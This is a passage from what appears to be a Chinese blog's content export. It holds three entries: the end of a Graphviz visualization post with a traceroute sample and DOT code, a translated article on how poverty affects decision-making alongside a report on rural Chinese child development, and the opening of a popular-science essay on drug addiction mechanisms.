12345678910111213141516[root@li1437-101 ~]# traceroute www.google.comtraceroute to www.google.com (216.58.216.36), 30 hops max, 60 byte packets 1 23.92.24.2 (23.92.24.2) 0.704 ms 0.736 ms 23.92.24.3 (23.92.24.3) 0.575 ms 2 173.230.159.16 (173.230.159.16) 0.910 ms 173.230.159.14 (173.230.159.14) 2.265 ms 173.230.159.0 (173.230.159.0) 0.731 ms 3 as15169.sfmix.org (206.197.187.50) 4.039 ms eqixsj-google-gige.google.com (206.223.116.21) 0.718 ms as15169.sfmix.org (206.197.187.50) 3.944 ms 4 108.170.242.227 (108.170.242.227) 4.902 ms 108.170.242.226 (108.170.242.226) 3.003 ms 108.170.243.2 (108.170.243.2) 3.064 ms 5 216.239.47.37 (216.239.47.37) 4.836 ms 64.233.174.91 (64.233.174.91) 1.476 ms 1.447 ms 6 216.239.54.22 (216.239.54.22) 12.464 ms 29.292 ms 64.233.174.204 (64.233.174.204) 9.032 ms 7 209.85.245.172 (209.85.245.172) 10.633 ms 108.170.230.130 (108.170.230.130) 20.010 ms 108.170.230.124 (108.170.230.124) 8.988 ms10 lax02s22-in-f4.1e100.net (216.58.216.36) 10.358 ms 10.383 ms 10.301 ms 12345678digraph &#123; label="Google Trace Sample"; "23.92.24.2" [label="23.92.24.2 \n Fremont,California \n location:37.5670,-121.9829"] ; as15169 [label="as15169.sfmix.org \n San Francisco \n Metropolitan Internet Exchange"]; "108.170.242.227" [label="108.170.242.227 \n California \n location:37.4192,-122.0574"]; lax02s22 [label="ax02s22-in-f4.1e100.net \n Los_Angeles,California \n location:46.07305,-100.546"]; "23.92.24.2" -&gt; as15169 -&gt; "108.170.242.227" -&gt; lax02s22;&#125; 3、社会工程领域 决策树(Decision Tree)：人群鄙视链 复杂人物关系链分析（《红楼梦》、《权力的游戏》） 注意: 如果需要使用分组（Group）特性，子图的名称必须以“cluster”开头，否则无法识别 123456789101112131415161718192021222324252627digraph family &#123; label ="《红楼梦》人物关系谱·主要角色"; subgraph cluster_皇族&#123; label ="皇族"; bgcolor="mintcream"; node [ color="lightyellow", style="filled"]; 北静王 [label = "北静王",shape="Mrecord"]; 义忠顺王 [label = "义忠顺王",shape="Mrecord"]; 贾元春 [label = "贾元春（长女）\n 凤藻宫尚书·贤德妃",shape="Mrecord"]; &#125; subgraph cluster_宁国公&#123; label ="宁国公(西府)"; bgcolor="mintcream"; node [ color="green", style="filled"]; 贾演 [label = "贾演 \n 宁国公"]; 贾代化[label = "贾代化 \n 爵位：一等神威将军 \n 职务（武官）：京营节度使",shape="Mrecord"]; 贾演 -&gt; 贾代化[label = "子"]; ...... &#125; ......&#125; Resources Introducing DataViz a data-structure visualization library for Golang memmap: Visualize Data Structures using Graphvi (Turns arbitrary data structures into more easily understood graphs.) Python blockdiag Book《Eloquent JavaScript》| Written by Marijn Haverbeke 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 参考文献 Article:Grphviz and Dynagraph – Static and Dynamic Graph Drawing Tools | 2004 Emden Gansner (Google Inc.) Stephen C. North (Infovisible) Eleftherios Koutsofios (AT&amp;T) Emden Gansner (AT&amp;T Labs - Research) Graph Drawing by High-Dimensional Embedding | David Harel 《Journal of Graph Algorithms and Applications》 dotguide: Drawing graphs with dot | January 5,2015 用 Graphviz 可视化函数调用 | IBM developerworks ,2005 邱俊涛：使用graphviz绘制流程图（2015版） 周志华《机器学习》习题解答：Ch4.3 - 编程实现ID3算法 机器学习算法实践-决策树(Decision Tree) Sike:UML绘制-dot语言 类似Graphviz的工具是如何实现自动排版的？ | 知乎 你在鄙视链的哪一层？ 扒完社交网络关系才明白，《权力的游戏》凭什么是神作 | EGO影视荟]]></content>
      <tags>
        <tag>数据可视化</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[政府行为模型及预测:贫困问题(Poverty)]]></title>
    <url>%2F2017%2F09%2F08%2FPolicy-Poverty%2F</url>
    <content type="text"><![CDATA[摘要 贫穷如何改变你的思维模式:尽管稀缺可以帮助人们关注成本和收益，但也会造成压力，转移注意力并盗取认知带宽 斯坦福大学|农村教育行动计划（REAP）|FSI（Freeman Spogli Institute for International Studies at Stanford) 贫穷如何改变你的思维模式 理解心理学可能是解决问题的关键 原文链接：[http://review.chicagobooth.edu/behavioral-science/2018/article/how-poverty-changes-your-mind-set] ALICE G. WALTON | FEB 19, 2018 根据世界银行的数据，全球人口中每人每天的收入不到 1.90 美元的比例已经从2008 年的 18％ 下降到 2013 年的 11％ 。然而，在美国，贫困率更为顽固 - 2016年有 4100 万人生活在国家贫困线以下，约占人口的 13％，与2007年几乎相同。近期的政策举措对贫困问题并没有实质上改善。众议院议长保罗·瑞安（Paul Ryan ，威斯康星州共和党人）在去年12月份表示，2018 年政府将与贫困斗争作为优先事项，而且过去的福利政策也是很多共和党人认为失败的地方。 当福利计划（welfare programs）等投资不能使人们摆脱贫困时，美国国会议员表示沮丧。 “我认为应该帮助那些不能自己帮助自己的人，如果他们愿意的话，”在今年12月参议员奥林·哈奇（ Orrin Hatch，犹他州共和党人）解释他对政府支出的看法时说。 “我有一段艰难的时间，想要花费数十亿美元来帮助那些不会帮助自己的人，不做任何妥协，并期待联邦政府去做所有事情。” “I have a rough time wanting to spend billions and billions and trillions of dollars to help people who won’t help themselves, won’t lift a finger, and expect the federal government to do everything.” 哈奇的声明反映了一种普遍观点，即取消政府支持将迫使许多穷人自己改善自己的生存状况。如果没有福利和政府的帮助，健全的人会找到工作，接受教育，停止购买彩票，并专注于支付账单？ 研究人员表明并不完全如此，他们的工作正在讲述一个不同的贫穷故事。与生活常识相反—不好的决定导致贫困，数据表明，陷于贫穷造成的认知缺陷往往促使人们作出糟糕的决策。实际上，那些似乎适得其反的决定可能是完全合理的，甚至是精明的。研究建议，更多地考虑到这种心理，将有助于成功减少贫困。 是什么推动’糟糕的’决定2013 年，一项发表在《科学》杂志上的研究中发现（研究人员来自华威大学University of Warwick，哈佛，普林斯顿和哥伦比亚大学），对于贫困的个人来说，在处理困难的财务问题会产生认知压力，相当于在智商测试中得分低于 13 分，或整晚失眠。在真实的金融压力下，人们观察到类似的认知缺陷。他们的研究是众多研究中的一个，表明贫穷会损害认知能力。 但事实上，认知似乎随着财务状况的变化而变化，来自芝加哥大学布斯商学院（University of Chicago Booth School of Business）的 Anuj K. Shah 以及 Sendhil Mullainathan（哈佛） 和 Eldar Shafir （普林斯顿）是科学论文的作者，他们有兴趣找到根源所在。他们怀疑贫困本质上可能会创造出一种新的思维方式，这种思维方式会改变人们的注意力，从而影响他们如何做出决定。 “有人说你真的需要了解穷人广泛的社会结构，以及人们有/没有接触到的东西，” Sendhil Mullainathan 说。 “其他人说，穷人有不同的价值或偏好。我们退后一步：’还有其他原因吗？’” 你在想什么？为了测试这个想法，研究人员设计了一些实验，剥离金钱并置换为其他资源。在一项此类研究中，研究人员让参与者玩游戏，一款 “Wheel of Fortune 命运之轮”，“Angry Birds 愤怒的小鸟”和“Family Feud”（答题游戏）的变体，研究稀缺程度如何影响玩家的注意力。规则设计中的“富有”的人有更多的机会获得积分，所以也有更多时间玩这个游戏。 “贫穷”的人机会则较少。 在“命运之轮”风格的游戏中，研究人员测量了玩家的认知疲劳度。从逻辑上预测富有的玩家会更加疲惫，因为他们被允许完更多回合、做出更多的猜测。与此相反的是，研究人员观察到，扮演“穷人”的玩家更加疲惫 —— 他们尝试猜测答案的次数更少，因而每次猜测都要付出更多努力。 在“愤怒的小鸟”风格的游戏中（游戏者需要射击目标），扮演“富人”的玩家有更多机会利用虚拟弹弓瞄准目标。扮演“穷人”的玩家，由于尝试次数减少，因而花费了更多的投篮时间，而且许多人每次投篮得分都比“富人”玩家多。对于所有扮演“富人”的玩家而言，额外的投篮次数并没有导致他们的分数相应地提高。 “看来要理解稀缺心理（ the psychology of scarcity），我们也必须认识到富有心理（the psychology of abundance）。如果稀缺能够让我们过度参与，那么富有可能会让我们参与太少，” 研究人员写道。 一击致命使用视频游戏场景来测试稀缺的影响，研究人员发现那些机会有限的人表现更好。 在某些方面，稀缺似乎让人们更好地解决问题。 在这些版本的游戏世界中，被随机分配为“穷人”的玩家将注意力集中在他们面前的具体问题。这就是现实生活中发生的事情，Shah，Mullainathan 和 Shafir 写到。当资金紧张时，“可用资源的非常缺乏，使得每笔开支都更加刚性和更加紧迫。到杂货店的旅程看起来更大，本月的房租不断吸引我们的注意力。因为这些问题越来越大，引起我们的注意，我们专注于更加深入地解决它们。” 不幸的是，短期内解决问题的一种方法是借贷，这可能会适得其反。在实验中，当扮演“穷人”的玩家被允许借用资源时，这种借贷破坏了稀缺带来的一些优势。当研究人员将此类表现看作是借贷函数时，他们发现扮演“穷人”的玩家常常是借贷比他们所需的更多的钱，同时，当他们不允许借贷时表现得更好。贫穷导致了明智的决定，但也导致了适得其反的结果。 权衡成为现实Shah，Mullainathan 和 Shafir 进一步研究了贫困如何影响决策，并发现穷人可能比他们更富有的人更好地评估、权衡。正如“愤怒的小鸟”玩家花更多时间排队投篮一样，有实际经济担忧的人也可能做得更好，更专注地决策，更接近经济学家认为的理想选择。 研究人员询问了实际生活中各社会经济阶层人士，他们是否愿意在价值 300 美元的平板电脑上额外花 30 分钟以节省 50 美元。有人说他们是。但是当被问及他们是否会在价值 1,000 美元的平板电脑上作出同样的选择时，一些受访者改变了主意。他们的答案取决于他们的收入。 大脑中的钱对于穷人来说，从未远离关于金钱的想法。事实上，就像在喧嚣的谈话中专注于自己的名字一样，穷人可能更容易调整事物的财务状况。 当选择购买 300 美元的平板电脑而不是 1000 美元的平板电脑时，许多人非理性地更倾向于说“是”。但是这种反应在富裕人群中更为常见。对于贫穷的人来说，平板电脑的成本通常并不重要 — 无论价格如何，他们都可能为了折扣而旅行。 根据传统经济学，这是正确的财务决策 — 无论原始成本（the original cost）如何，都可以获得额外的收益。无论有关物品的数量如何，节省 50 美元都是一样的。但更富有的参与者看到节省的相对价值（relative terms），注意到的是节省的百分比。相比之下，较贫穷的参与者想到的是绝对价值（absolute terms）。对他们来说，节省的 50 美元就是是花在杂货或电费上的 50 美元。 相同的模式在越来越多的涉及金钱或其他奖励的实验中出现。即使卡路里也符合这种模式：那些正在节食并因此处于稀缺心态的人认为，一份麦当劳薯条与日常或每周的卡路里摄入量一样都会使人肥胖。但是没有节食的人更受上下文的影响。再次说明，稀缺促使人们作出更准确的决定。 付诸实践如果贫困人士在考虑到这种情况的情况下可以做出明智的决定，那么如何才能使他们得到承认及更好的鼓励？当他们面临潜在的昂贵借款决定时，可能有办法帮助人们。例如，芝加哥大学布斯商学院的 Marianne Bertrand 和加州大学伯克利分校的 Adair Morse 研究了高息发薪日贷款，发现当利率用美元金额表示时（即他们不得不在三个月里需要支付的费用），人们做出了更好的决定。 “我们会解释这一点，说美元数额更具体，你可以仔细想想你不得不放弃偿还贷款。” 芝加哥大学布斯商学院的 Christopher J. Bryan 说：“（扶贫）项目设计者和决策者往往因未能准确把握他们想要帮助的人的视角而遭受挫折。 “他们设计的方案如果能够将精心的思考和专注度考虑在内，就会吸引人们的注意力。但是，贫穷给人们带来了沉重的注意力“征税”，使人们无法将这种想法投入到新的机会中，因此扶贫计划的吸收率很低。” 金融压力影响决策即使对于没有贫困的人来说，财务压力也会影响决策 —— 一些公司正在采取措施来解决这个问题。 布赖恩（Bryan）是一份政策文件的主要作者，该文件根据最近的调查结果向决策者和其他相关方面推荐新策略。除此之外，他和他的核心研究人员建议努力降低未来导向行为的前期成本（up-front cost of future-oriented behaviors）。例如，他们指出，在世界银行，哈佛大学和耶鲁大学的研究人员的一项研究中，给予孩子们免费校服，能使肯尼亚的入学率提高了6个百分点以上。同样，斯坦福大学，哈佛大学和多伦多大学的研究人员与H＆R Block 联合发现，向美国学生提供的援助可以帮助他们申请联邦资助，已经被证明可以提高 24％ 的大学入学率。 研究人员敦促服务提供商仔细衡量价格和不便，特别是在提供与健康相关的服务时，如果成本或距离太大，很多人可能会放弃。乌干达的一个项目向人们送去了净化水的药片和抗疟药等保健产品，避免了人们为了获得这些产品而出差的问题。采取措施解决寻找产品和服务带来的不便，这一简单方法非常有效。研究人员写道：“有时与其提供免费而非常不方便的服务，还不如收取少量费用但是提供便利的服务来的效果好。” 在这种情况下，交货成本已经包含在产品的价格中。 研究人员还建议考虑奖励的时机 —— 他们建议避免在资金紧张的情况下提供这些奖励，人们在满足基本需求时只需要花费很少的预算。根据之前提到的 2013 年《科学》发表的相关研究数据，在印度，甘蔗种植者每年在收获后支付报酬，农民在 IQ 测试中的专注度评分（attention scores）相比收获前搞 10 个智商点（收获前农民相对较贫穷）。 如果人们更容易接受并有余力来考虑他们（如收获或发薪日后），则可提供补贴或其他奖励措施，从长远来看可能会产生影响。在坦桑尼亚，一项努力要求人们在发薪日后立即在现金点位置注册健康保险，并且时机使得医疗保险的使用增加了20个百分点。 引入认知辅助可以帮助解决有限的注意力（可能会限制人们的贫困）。在一项研究中，致力于向农民展示农作物最有效的种植方式。当农民处于贫穷、紧张、缺乏思想的状态，他们在获取信息方面显得更加困难。 “这一结果与农民的智慧无关，”布莱恩的团队写道。 “如果观察者有足够多余的注意力（the spare attentional capacity），事实就很明显。” 他们还建议以提示卡（短信或贴纸的形式）提醒可能会有效。这种温和的推动 - 例如按时服药 —— 可以帮助人们记住他们可能会忘记的事情，因为其他事务可能会引起干扰注意力。 对于那些设计和实施反贫困举措的人来说，重要的是要认识到，尽管稀缺可以帮助人们关注成本和收益，但也会造成压力，转移注意力并盗取认知带宽。研究人员写道，理解贫困所施加的这些心理限制将是向前迈出的一大步，制定一些政策调整措施，以“大幅改善它们对穷人的影响”。 斯坦福大学|农村教育行动计划（REAP） FSI（Freeman Spogli Institute for International Studies at Stanford) 罗斯高（Scott Rozelle）| 斯坦福大学教授 在过去十几年致力于中国西部贫困农村地区的研究，目标是缩小西部农村地区儿童与中国其他地区儿童在教育、营养、健康水平上的差距。调研总样本总计包括超过13万名儿童及其家庭。 斯坦福研究：中国西部农村贫困地区婴儿智力偏低 | 2016-10-17 财新网（记者 石睿）教授罗斯高认为，53%的贫困农村儿童智商偏低，一是基因问题，二是营养不足，三是养育不科学，儿童监护人不懂如何科学的养育孩子，“这是最大的问题” 美国斯坦福大学教授罗斯高（Scott Rozelle）参与的一项中国地区抽样调查显示，在24—30个月的贫困农村汉族儿童中，有53%的比例智商偏低。如果在婴儿早期不能通过科学养育、补充营养等方式及时干预，未来中国劳动力素质将很难整体提高，甚至会限制经济进一步发展。罗斯高参与组织的“农村教育行动计划（简称REAP）”在过去十几年致力于中国西部贫困农村地区的研究，目标是缩小西部农村地区儿童与中国其他地区儿童在教育、营养、健康水平上的差距。调研总样本总计包括超过13万名儿童及其家庭。据罗斯高介绍，REAP在陕西、河北、云南进行的一项抽样调查发现，53%的贫困农村汉族孩子在24—30个月大时，IQ（智商）测试成绩低于90。对此，罗斯高告诉财新记者，IQ低于90意味着有一定智力问题，“在美国，这样的孩子都放在特殊教育学校”。罗斯高分析认为，出现上述现象的原因有三个，一是基因问题；二是营养不足；三是养育不科学，罗斯高表示，三个原因中，儿童监护人不懂如何科学的养育孩子，“这是最大的问题”。罗斯高告诉财新记者，调查显示，绝大部分家长都是非常爱孩子，喜欢和孩子在一起；但是当我们问到：具体昨天有没有跟孩子玩？有没有唱歌给他们听？有没有读书给他们听？有没有讲故事给他们听？“只有极少比例家长有做到这些，70%的家庭只有0或者1本书。”为此，REAP团队和国家卫计委合作开展了“养育未来”婴儿早期发展项目，培养当地计生干部入户教育、帮助农村儿童监护人养育孩子，包括读书、跟孩子玩、讲故事等方法。罗斯高发现，如果母亲在家庭中照顾子女，在教育母亲科学的养育方法后，孩子的IQ可以提高差不多10个点；如果母亲外出务工，90%的留守儿童会是由奶奶照顾，但是工作人员教授奶奶养育方法后，孩子的IQ却很难提高，“这是留守儿童最严重的问题”。但是，罗斯高强调，“留守儿童并非是最弱势的儿童”。他向财新记者介绍，在非常贫穷的地方，父母外出打工的收入，远远高于当地务农收入，相应子女在营养、学习上获得的资金投入会更多，REAP调查显示，这些地方留守儿童的营养和学业水平要高于父母在家的儿童。整体来看，REAP的调查显示，除了心理健康外，贫困地区留守儿童在营养、健康和教育等其它各方面均与父母双方在家的儿童相当甚至更好。罗斯高认为，“所有贫困农村地区的儿童都急需更良好的教育、更全面的营养以及更高质量的医疗保健”。罗斯高提出，儿童到三岁之后，IQ就较难再提高。REAP团队在甘肃针对13、14岁年龄段的智商测试显示，55%的测试者IQ低于90。对此，罗斯高表示，原来大部分农村劳动力在家务农，劳动力IQ水平对于劳动影响不大；现在则大部分从事低端制作业，工作也相对简单。罗斯高举例称，郑州的富士康招工时，会进行智力测试，如果应聘者IQ测试成绩太高，则不会被录用，因为富士康的工作非常简单，培训新员工只需要12分钟，如果员工IQ太高，很快就会对工作厌烦。但是罗斯高对于农村地区儿童IQ水平的现状十分担忧。“现在的问题是未来低端就业会越来越少，这些孩子以后怎么办？如果有这么多劳动力的IQ水平较低，未来中国如何怎么变成发达国家？” 扩展阅读 芝加哥大学：贫穷如何改变你的思维模式 数据可视化（十）公共数据源列表 数据可视化（五）基于网络爬虫制作数据可视化图表 图表数据可视化技术方案 基于网络爬虫的可视化图表 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 案例：世界主要国家专利申请变化情况（欧洲专利局） 在线演示 参考文献 《美国公共健康杂志》| 在美国，富人比穷人多活九年半]]></content>
      <tags>
        <tag>Science</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嗑药简史：药物成瘾与神经系统]]></title>
    <url>%2F2017%2F09%2F04%2FAddiction-Decision%2F</url>
    <content type="text"><![CDATA[摘要 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 人类生活中的瘾品：饮食、性行为、运动、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 瘾品管制思路变迁：戈尔巴乔夫的禁酒运动 一、什么是瘾？瘾被用于描述精神强迫或者过度的心理依赖。瘾有分为物质成瘾及行为成瘾。例如物质依赖，药物滥用（即毒瘾）、酒瘾、烟瘾。行为成瘾是和物质无关的强迫症，例如持续出现特定行为，例如赌博、暴饮暴食，网瘾、官瘾、财迷、工作狂、色情狂、及购物狂等。成瘾（Addiction） 是指一种重复性的强迫行为，即使这些行为已知可能造成不良后果的情形下，仍然被持续重复。这种行为可能因中枢神经系统功能失调造成，重复这些行为也可以反过来造成神经功能受损。 Addiction is a medical condition that is characterized by compulsive engagement in rewarding stimuli, despite adverse consequences. It can be thought of as a disease or biological process leading to such behaviors. The two properties that characterize all addictive stimuli are that they are reinforcing (i.e., they increase the likelihood that a person will seek repeated exposure to them) and intrinsically rewarding (i.e., something perceived as being positive or desirable). 二、药物成瘾（drug addiction）药物成瘾是指需要服用药物才能使日常生活表现正常的强迫行为。出现物质依赖状况后，若突然停止服用药物，可能出现药物戒断症状。许多原本用于医学用途的药品，可能造成物质依赖现象；若是被法律管制，视为非法者，则被称为毒品。根据权威医学期刊《The Lancet》(柳叶刀)发表的有关研究，常见管制药品（毒品）的依赖性（出现 依赖和戒断症状（Dependence and withdrawal） 的概率）和生理程度如下图所示，值得注意的是，酒精和烟草对人体的生理伤害与依赖性强度并不亚于未提纯的鸦片。 类别 名称 医药用途 管制级别 成瘾机制 麻醉镇痛剂（Narcotics Analgesics） 鸦片 无 管制 欣快感、幻觉 麻醉镇痛剂（Narcotics Analgesics） 吗啡 镇痛剂 管制 强效镇痛 麻醉镇痛剂（Narcotics Analgesics） 美沙酮 戒毒治疗 管制 —– 麻醉镇痛剂（Narcotics Analgesics） 氯氨酮 短效麻醉剂（小手术），全身麻醉诱导剂 中国（一类） 美国（三类） —– 麻醉镇痛剂（Narcotics Analgesics） 海洛因（二乙酰吗啡） 无 刑事重罪 —– 迷幻剂（Hallucinogens） 大麻及相关制品 无 —– 产生幻觉，娱乐道具 镇抑剂（Depressants） 巴比妥及相关制品 镇静神经、催眠、抗痉挛 —– —– 镇抑剂（Depressants） 甲喹酮 无 —– —– 镇抑剂（Depressants） y-羟丁酸 无 —– —– 兴奋剂（Stimulants） 安非他命（苯丙胺），俗称麻古／大力丸 无 —– 增强性欲和促进欣快感 兴奋剂（Stimulants） 亚甲二氧基（亚甲二氧甲基苯丙胺，MDMA），摇头丸 无 —– —– 兴奋剂（Stimulants） 甲基苯丙胺，冰毒 无 —– 使机体产生强烈快感 兴奋剂（Stimulants） 卡西酮的衍生物 无 —– —– 兴奋剂（Stimulants） 可卡因 麻醉 —– 提升肾上腺素／多巴胺在脑部的浓度 镇静剂（Tranquillizers） 安定、艾司唑仑、三唑仑等 催眠 —– 成瘾／胎儿不正常/认知和神经讯息传递功能受损 其他 可待因 止咳 —- —– 其他 同化类固醇 —– —– 激素；扩增肌肉和骨头强度（心理需求） 其他 酒精 —– —– —– 其他 烟草（尼古丁） —– —– 兴奋神经促进分泌更多的多巴胺，产生幸福感和放松感 2.1 鸦片（opium）天然麻醉抑制剂，医学上作麻醉性镇痛药；非科学研究或非医用，则归类于毒品。鸦片的主要成份是吗啡类生物碱，包括 吗啡（10%-14%），可待因（1%-3%，可待因进入人体后约有10%的吸收分量在体内经代谢作用转化成吗啡），蒂巴因（Thebaine，0.2%，具备痉挛毒性）。给药后分布于全身，在肾、肝、肺中浓度较高。 鸦片的成瘾机制：吗啡（Morphine）能直接作用于中枢神经系统，改变人体对疼痛的感觉。吸食鸦片后开始能让人产生欣快感，产生梦幻现象，进而导致高度心理及生理依赖性。长期使用后停止则会发生严重的戒断症状：渴求药物、流鼻水、易怒、发抖、寒颤、厌食等戒断症状；过量使用造成急性中毒，症状包括昏迷、呼吸抑制、低血压、瞳孔变小，严重的引起呼吸抑止致人死亡。 芬太尼（Fentanyl）是一种强效类鸦片止痛剂，起效迅速而作用时间极短（脑中μ-鸦片受体），比吗啡效力高50至100倍。保罗·扬森最先在1960年制造出芬太尼。芬太尼在1960年代以商业名称Sublimaze进入医疗用途作为全身麻醉剂。芬太尼药物形式包括贴片、棒棒糖、溶解片剂和可以被口腔黏膜吸收掉的舌下喷剂等。截至2013年，全球共使用了1700公斤（3,750磅），是医学中使用最广泛的合成鸦片类药物。 芬太尼也被用作娱乐性用药，导致大量药物过量死亡案例。美国司法部于2017年10月17日起诉两名中国公民 —— 颜小冰(Xiaobing Yan音译)和张剑(Jian Zhang 音译)被指控策划通过邮件或国际邮递服务在美国销售大批量的芬太尼等鸦片类药物。美国疾病控制中心估计 2016 年有 2 万人死于芬太尼。该案成为中美两国激烈交锋的外交事件。（中国官方文件称为“新精神活性物质”，2017年初中国将芬太尼——卡芬太尼、呋喃芬太尼、丙烯酰芬太尼、戊酰芬太尼等列入非药用类麻醉药品和精神药品管制品种目录） 2.2 海洛因（heroin）海洛因（heroin 或 diacetylmorphine），学名 二乙酰吗啡；又译海洛英，有强烈的成瘾性。在医学上，海洛因可作为强效镇痛药物，用于心脏病、外伤、手术后的剧痛。 第一次合成海洛因是在1874年（清同治13年，日本明治7年），任职伦敦圣玛莉医院的化学家伟特（C.R Wright）（吗啡+醋酸酐，加热，得到二乙酰吗啡）。1897年，德国化学家菲力克斯·霍夫曼再次合成二乙酰吗啡（11日前，他刚成功将阿斯匹林制成药物）。1898年至1910年，海洛因作为一种止咳处方药出售，非常畅销。[海洛因（Heroin）的名字由拜尔药厂注册，拜耳公司曾尝试隐瞒其危害。] 海洛因的成瘾机制：初次使有感觉愉快安静，产生梦幻现象（ Heroin 一词源自德文 heroisch，意指英雄，因为海洛因会 给服用者一种英雄般的感觉）。海洛因在肝脏中会代谢成吗啡。吸食之后的12小时，身体由于得不到麻醉剂而不能正常运作，即时出现紧张、无法入睡、出汗、肠胃不适、四肢疼痛及痉挛等断瘾症状（持续三到五天）。过量使用造成急性中毒，症状包括昏睡、呼吸抑制、低血压、瞳孔变小。海洛因具高度心理及生理依赖性，上瘾的人因身体对它有适应性，会不断增加分量以得到相同的效果，滥用越久，戒断症状越长。长期使用后停药会发生渴求药物、不安、流泪、流汗、流鼻水、易怒、发抖、恶寒、打冷颤、厌食、腹泻、身体卷曲、抽筋等。 2.3 安非他命（Amphetamine，苯丙胺）安非他命（Amphetamine）是一种中枢神经兴奋剂。 最早于1887年被发现，在许多国家为合法的处方药，用来治疗注意力不足过动症、嗜睡症、和肥胖症，历史上也曾被用来治疗鼻塞和抑郁。安非他命适度适量地使用能提升整体抑制控制能力。在医疗用的剂量范围内，安非他命能带来情绪以及执行功能的变化，包含：减少反应时间、降低疲劳、以及肌耐力的增强。然而，若摄取剂量远超过医疗用的剂量范围，将会导致大脑执行功能受损以及横纹肌溶解症，可引发严重的药物成瘾，引起精神疾病（例如：妄想、偏执）。 安非他命的成瘾机制：安非他命作用于神经传导元素正肾上腺素及多巴胺，增加了单胺类神经递质在脑内的活动，服用后可以增强欣快感、提升性欲、提升清醒度、大脑执行功能发生变化。非医疗用途情况下，很多人为享乐而滥用安非他命，例如助兴时被作为增强性欲和欣快感促进剂（通常会远超过医疗用剂量范围）。滥用的副作用非常严重甚至致命。在成瘾患者停用安非他命后，出现戒断症状的概率接近九成。安非他命的戒断症状可能包含：对于各种刺激极度敏感、躁动不安（irritability）、焦虑、对于安非他命有难以抑制的渴求、烦躁、疲倦、食欲放大、过动或行动迟缓、缺乏动机、嗜睡、和清醒梦（lucid dreams）。 2.4 甲基苯丙胺（methamphetamine）甲基苯丙胺或甲基安非他命（methamphetamine），一种人工合成的兴奋剂。最早由日本化学家长井长义于1893年自麻黄碱成功合成，其盐酸盐或硫酸盐又称冰毒。 甲基苯丙胺的成瘾机制：甲基苯丙胺与苯丙胺，MDMA（摇头丸）的化学结构非常相似，可以提升多巴胺等神经递质在脑内的浓度。服用后使机体 产生强烈快感。短期内增强精神力，动力和大脑活力，大剂量服用会增加愉悦幸福感，性刺激增强，驱除睡意等。甲基苯丙胺是一种高度心理上瘾的毒品，对于大多数上瘾的人来说，再次复发是很常见的。严重副作用：精神病（思想偏执和精神分裂），临床的抑郁症（兴奋之后紧接着心理抑郁），以及肾脏及肝功能严重损伤。 2.5 可卡因（Cocaine，古柯碱）可卡因（Cocaine，古柯碱）是由古柯的叶子制成，是一种强烈的兴奋剂。 古柯的主要产地在南美。1855年，德国化学家斐德烈（G.Friedrich）首度从古柯叶中提取出麻药成分，并命名为 “Erythroxylon” 。四年后，斐德烈的同事纽曼（A.Newman）又精制出更高纯度的物质，替名为“可卡因”（Cocaine）。 可卡因的成瘾机制：可卡因是5-羟色胺、去甲肾上腺素，和多巴胺的再摄取抑制剂，使脑部这三种神经递质的浓度上升，服用后产生强烈的欣快感或者精神激动。可卡因作用于脑中的奖赏路径，人为了获得快乐感而上瘾。但是持续反复使用可卡因，会减少感觉快乐的能力与身体疲累。可卡因可以轻易地通过血脑屏障，而且可能会造成血脑屏障的破坏，阻碍脑部神经传递质多巴胺、并影响正肾上腺素、血清素正常摄取，加速大脑老化。除此，可卡因还会严重影响神经系统、血管的收缩、瞳孔的扩大及导致心跳不正常。 2.6 大麻（Cannabis sativa）大麻（Cannabis sativa），可作为纺织原料。主要成份：四氢大麻酚（Tetrahydrocannabinol，THC），精神活性物质，致幻。大麻二酚（CBD）具有治疗焦虑、癫痫的辅助作用。故“大麻是否是毒品”一说在全球仍具争议（吸食大麻在大部分国家仍是违法，但在荷兰、捷克、以及美国的科罗拉多州和华盛顿州，可以在法律范围内吸食大麻）。 2.7 酒精（Ethanol，乙醇）自史前时代开始人类就已开始喝酒，在中国发现的新石器时代（九千年前）陶器上面就有酒的残留物，而其中会使人欣快的主要成分就是酒精。 酒精能扩散穿过胃壁细胞，是一种可以在胃中被吸收的物质（非常罕见），但它主要还是在小肠中吸收，最后到达肝脏被代谢。酒精通过血液循环系统经过心脏的时候，可以降低心脏收缩力，导致心脏只会泵送更少量的血，因而降低身体的血压。酒精会使血管扩张，因此人会感到温暖（脸变得红晕和粉红色）。有研究表明，喝酒行为与抑郁症有非常紧密的关系。有人借助酒精的神经抑制作用，达到增強自信、疏解压力与不快情绪的效果，即所谓“借酒消愁”。很多社群存在的饮酒文化中，也是利用酒精作为一种社交“黏合剂”。对于大多数人而言，饮酒之后可以降低警觉性，消除拘谨不自然的感觉，对于很多具有社交恐惧的人来说，酒能令人在聚会中无拘无束流畅地说话。在某些情况下，酒精也能释放极端情绪，例如愤怒、暴力和自我伤害行为，即所谓“酒入愁肠愁更愁”。 酒精的成瘾机制：酒精成瘾（Alcohol addiction）。一般在饮用四十分钟内，血液中酒精浓度达到最高值，并逐渐对大脑皮质发挥抑制作用，使人呈现失去自我控制的兴奋状态，所以酒精实质上是一种 